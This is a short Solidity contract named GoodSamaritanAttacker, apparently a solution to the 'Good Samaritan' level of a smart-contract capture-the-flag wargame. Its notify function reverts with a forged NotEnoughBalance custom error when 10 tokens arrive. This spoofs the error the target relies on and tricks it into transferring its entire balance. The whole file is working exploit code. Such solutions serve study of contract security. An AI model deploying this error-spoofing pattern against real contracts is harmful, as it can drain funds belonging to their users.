pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttacker {

    error NotEnoughBalance();

    function attack(address _target) external {

        IGoodSamaritan(_target).requestDonation();
    }

    function notify(uint256 _amount) external pure {
        if(_amount == 10) {
            revert NotEnoughBalance();
        }
    }
}